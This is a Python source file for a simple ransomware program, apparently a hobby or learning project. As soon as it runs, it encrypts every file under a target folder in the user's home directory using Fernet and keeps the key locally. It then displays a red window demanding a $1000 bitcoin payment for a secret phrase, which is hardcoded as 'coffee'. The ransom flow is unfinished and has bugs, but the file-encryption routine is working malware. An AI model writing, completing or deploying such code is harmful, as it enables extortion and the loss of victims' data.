from pathlib import Path
from cryptography.fernet import Fernet
import sys
import tkinter as tk
from  tkinter import messagebox
from PIL import Image, ImageTk
import os
# get the home dirrectory
home_dir = Path.home()
print(home_dir)


target_folder =Path.home()/"David_cyber"
# folders to ignore when encryptin file
Ignore_folders = ["AppData", "Library", "Local Settings", "git", "node_modules"]

#  a folder that will install
# For windows
# app_data = os.path.join(os.environ["ZDOTDIR"], "pyth0n")
# for linux
app_data = os.path.join(os.environ["ZDOTDIR"], "pyth0n")

# create the folder
os.makedirs(app_data, exist_ok=True)

# define the path to store the encryption key
key_path = os.path.join(app_data, "key.key")

# create function to encrypt the file
def encrypt ():

    # ?create a list of all files
    files =[]

    # find al the files and folders

    for item in target_folder.rglob("*"):
        try:
            if any (folder in item.parts for folder in Ignore_folders):
                continue #skip this folder
            
            if item.is_file():
                # append the files to our list
                files.append(str(item))
        except (PermissionError, FileNotFoundError):
            continue
    # print(len(files))
    # generate encryption key
    key_file = Path(key_path)
    if not key_file.exists():
        key = Fernet.generate_key()

        with open (key_file, "wb") as keyFile:
            keyFile.write(key)

    else:
        with open (key_file, "rb") as keyFile:
            key = keyFile.read()

    # use the key top encrypt the files
    for file in files:
        # read the content of the file
        with open (file, "rb") as originalFile:
            content = originalFile.read()
            # encrypt the content
            encrypted_content = Fernet(key).encrypt(content)
        # write changes in the file
        with open (file, "wb") as newFile:
            newFile.write(encrypted_content)
encrypt()


# create function to dencrypt the file
def decrypt (user_phrase):

    # create a list of all files
    files =[]

    # find al the files and folders

    for item in target_folder.rglob("*"):
        try:
            if any (folder in item.parts for folder in Ignore_folders):
                continue #skip this folder
            
            if item.is_file():
                # append the files to our list
                files.append(str(item))
        except (PermissionError, FileNotFoundError):
            continue
    # print(len(files))
    # generate encryption key
    with open (key_path, "rb") as keyFile:

        key =keyFile.read()

    # create a secreate code to decrypt
    secret_phrase = "coffee"

    # check if secter phrase is correct
    if user_phrase.lower() == secret_phrase.lower():


        # use the key to decrypt the files
        for file in files:
            # read the content of the file
            with open (file, "rb") as encryptedFile:
                content = encryptedFile.read()
                # encrypt the content
                decrypted_content = Fernet(key).decrypt(content)
            # write changes in the file
            with open (file, "wb") as newFile:
                newFile.write(decrypted_content)
# submit fuunction

# onclose function

# read files
def relativePath(relative_path):
    try :
        based_path = Path(sys.MEIPASS)  #TEMPORALY FOLDER

    except:
        based_path = Path(".")
    return based_path / relative_path
# define the image path
image_path = relativePath("images.png")

# we call encryption function

# user interface
root = tk.Tk()
root.title("Your Files are Encrypted")
root.resizable(False, False)
root.config(bg="#cc0000")


# ican image
icon = tk.PhotoImage(file=relativePath("images.png"))
root.iconphoto(True,icon)

# define the size of the window
window_width = 500
window_height = 450
screen_width = root.winfo_screenwidth()
screen_height = root.winfo_screenheight()

x = int((screen_width/2) - (window_width/2))
y = int((screen_height/2) - (window_height/2))

root.geometry(f"{window_width}x{window_height}+{x}+{y}")

title = tk.Label(
    root,
    text="Your files are encrypted",
    font=("Arial",14,"bold"),
    bg= "#cc0000",
    fg="white",



)
title.pack(pady=5)

try:
    image = Image.open(relativePath("images.png"))
    image = image.resize(80, 80)
    lock_img =ImageTk.PhotoImage(image)
    image_label = tk.Label(root, image=lock_img, bg="#cc0000")
    image_label.pack(pady=(15,5))
except Exception:
    pass


title2= tk.Label(
    root,
    text="Pay $1000 to our bitcoin wallet 6475215454|n to getsecret phrasse to decrypt them |nbefore time runs out!",
    font=("Arial",12,"bold"),
    bg= "#cc0000",
    fg="white",
    justify= "center"



)
title2.pack(pady=10)

msg= tk.Label(
    root,
    text="Enter sectret phrase to continue",
    font=("Arial",12,"bold"),
    bg= "#cc0000",
    fg="white",
    justify= "center"



)
msg.pack(pady=5)

input = tk.Entry(root, width=30, font=("Arial", 14))
input.pack(pady=15)
input.pack(padx=30)
# SHOW THE DIALOGUE 
root.mainloop()


